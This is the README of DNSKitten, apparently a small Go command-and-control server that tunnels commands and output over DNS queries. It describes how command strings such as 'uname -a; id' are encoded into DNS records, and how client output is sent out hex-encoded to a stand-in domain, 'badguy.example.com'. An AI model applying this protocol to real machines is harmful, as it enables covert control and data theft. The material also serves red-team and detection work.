DNSKitten
=========

In the spirit of netcat, but uses DNS instead of TCP.  Directly inspired by
[dnscat2](https://github.com/iagox86/dnscat2), but much smaller and
client-agnostic.

Features:
- Sends data from stdin to a client via DNS
- Sends data from DNS requests from a client to stdout
- Ignores duplicate requests

For legal use only.

Installation
------------
```bash
go get github.com/magisterquis/dnskitten
```

The included build.sh script can be used to build for a variety of platforms.

Clients
-------
There is no one reference client (i.e. malware) for DNSKitten.  In the
[`clients`](./clients) directory ~are some~ is an example~s~, but in general, DNSKitten
is client-agnostic.

DNSKitten does no demultiplexing of clients.  In general, it's a pretty simple
tool.  Multiple clients will need multiple intstances of DNSKitten.  One way to
do this is to assign each client a subdomain and have the main resolver forward
requests for each subdomain to a separate local instance of DNSKitten.  Tmux is
helpful for this.

Requests
--------
Each request must use a name (qname) which is unique for the previous 10240
requests.  This is to prevent caching and help mitigate duplicate output
caused by excitable resolvers trying to refresh cached data.  An easy way to do
this is to prepend a counter or random string to the domain in the request,
e.g. `example.com` -> `391.example.com`.

C2 -> Client
------------
Data to be sent from the C2 server to the Client (e.g. a command to execute)
can be requested with any of the following record types (qtype):

| QType | Encoding | Example                                                                                                                   |
|-------|----------|---------------------------------------------------------------------------------------------------------------------------|
| A     | Three bytes, base64-encoded                        | `who` -> `d2hv` -> 64.32.68.76                                                  |
| AAAA  | Same as A, but 12 encoded bytes                    | `uname -a; id` -> `dW5hbWUgLWE7IGlk` -> 6457:3568:6257:5567:4c57:4537:4947:6c6b |
| TXT   | A single byte string, up to 128 bytes              |                                                                                 |
| URI   | Same as TXT, with the Priority and Weight set to 0 |                                                                                 |

Client -> C2
------------
Data to be sent from the Client to the C2 server (e.g. command output) should
be hex-encoded and made the leftmost label of a domain ending in `.o.<domain>`.
Each request should be unique to prevent caching.  This is easily performed by
adding a label to the requested name with a counter or a random string.  An
NXDOMAIN response will be returned.

If the output to be returned is `kitten` and the domain is
`badguy.example.com`, a valid request might be
```
6b697474656e.1234.o.badguy.example.com
```
Note the label with 1234 is to prevent caching.

Examples
--------
Coming soon.

Windows
-------
Should work with no modifications.  Binaries available upon request.
